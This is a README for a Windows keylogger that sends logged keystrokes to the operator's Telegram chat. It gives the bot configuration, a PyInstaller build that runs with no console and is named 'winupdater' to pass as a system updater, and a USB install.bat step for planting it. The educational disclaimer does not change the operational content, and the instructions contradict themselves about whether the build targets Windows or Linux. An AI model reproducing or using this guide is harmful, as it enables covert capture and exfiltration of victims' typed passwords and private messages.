# 🛡️ Windows Keylogger with Telegram Notifications (Monolith Version)

> ⚠️ **Disclaimer**: This project is intended strictly for educational purposes. Do not use it on any computer without the owner's explicit permission.

## 📦 Overview

This is a monolithic version of a keylogger for **Windows** that periodically sends logged keystrokes to your **Telegram** chat using your own bot.

Final build must be compiled on **Windows** using PyInstaller.

---

## ⚙️ Configuration

Open the `logger_bot.py` file and set the following values:

```python
# ===== Configuration =====
TELEGRAM_BOT_TOKEN = "your_bot_token"
TELEGRAM_CHAT_ID = your_chat_id_as_integer

SEND_INTERVAL = 3600  # frequency of notification sending in seconds
```

---

## 🧱 Build Instructions

### 1. Install Python for Windows

- Visit: https://www.python.org/downloads/windows/
- Download the latest version (e.g., Python 3.12.x Windows installer 64-bit)
- Run the installer and **check** the box: `Add Python to PATH`
- Click **Install Now**

---

### 2. Open Command Prompt

- Press `Win + R`, type `cmd`, and hit Enter
- (Optional) Create and activate a virtual environment:

```cmd
python -m venv venv
venv\Scripts\activate
```

- Install dependencies:

```cmd
pip install pyinstaller pynput python-telegram-bot psutil
```

---

### 3. Build the executable

In the project folder, run:

```cmd
pyinstaller --noconsole --onefile --name winupdater logger_bot.py
```

After successful build, your `.exe` file will appear in the `dist/` folder.

---

### 4. Copy to USB

Copy the following 3 files to a USB stick:

- `install.bat`
- `uninstall.bat`
- `winupdater.exe` (from `dist/` folder)

---

## 🚀 Usage

- Run `install.bat` to install the keylogger and start sending logs to your Telegram chat via the bot.
- To **fully uninstall**, simply run `uninstall.bat`.

---

## 💡 Final Notes

Creating a Telegram bot is easy — search for `@BotFather` in Telegram and follow the instructions.  
This keylogger was built specifically for **Linux users building for Windows** and may require adjustments for non-standard environments.

---

## 🐧 Linux Note

> You likely won’t be able to use this project directly unless you're on Linux, as I designed and prepared the build process specifically for Linux-based setups.

That said — I **highly recommend** trying out Linux if you haven’t already 😉

